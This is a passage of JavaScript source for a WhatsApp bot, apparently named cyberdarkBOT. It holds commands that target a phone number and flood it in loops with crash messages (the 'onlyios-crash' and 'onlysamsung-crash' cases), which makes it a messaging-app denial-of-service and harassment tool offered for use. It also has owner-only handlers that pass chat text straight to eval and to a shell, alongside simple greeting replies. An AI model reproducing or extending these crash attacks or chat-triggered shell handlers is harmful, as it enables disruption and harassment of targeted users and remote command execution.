replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'onlyios-crash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break
case 'onlysamsung-crash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'makasih':
  replyy(`Sama-sama kak ${pushname} `)
break
case 'thanks':
  replyy(`Sama-sama kak ${pushname} `)
break

case 'ellen':
					rxhl.sendMessage(from, {text: 'Jangan Panggil Ellen Kak, Dia Lagi Sibuk'} )
					rxhl.sendMessage(from, {text: 'Tunggu Online Aja Dulu Kak Tuan Saya😊, \nReply By cyberdarkBOT'} )
					break
case 'cium':
          ellen = fs.readFileSync('./media/ciumm.mp3')
					rxhl.sendMessage(m.chat, {audio: ellen, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
					break
case 'sayang':
					rxhl.sendMessage(from, {text: 'Aku Juga Sayang Kamu Kak😍'} )
					break
case 'hallo':
					rxhl.sendMessage(from, {text: 'Iy Hallo Juga,\nUntuk Menggunakan Bot Ketik #menu'} )
					break
case 'hallo':
					rxhl.sendMessage(from, {text: 'Iy Hallo Juga,\nUntuk Menggunakan Bot Ketik #menu'} )
					break
case 'hai':
					rxhl.sendMessage(from, {text: 'Iy Hai Juga,\nUntuk Menggunakan Bot Ketik #menu'} )
					break
case 'assalamualaikum':
					rxhl.sendMessage(from, {text: 'Walaikumsalam'} )
					break
case 'kntl':
					rxhl.sendMessage(from, {text: 'Gunakan bahasa yang benar\nAnda akan kami banned!\nHubungi kami : wa.me/6282274542640'} )
					break
 default :           
if (budy.startsWith('=>')) {
if (!isCreator) return replyz('*Only Vip*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return replyz(bang)}
try {
replyz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replyz(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await replyz(evaled)
} catch (err) {
await replyz(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return replyz(`${err}`)
if (stdout) return replyz(stdout)
})
}

}
} catch (err) {
rxhl.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})

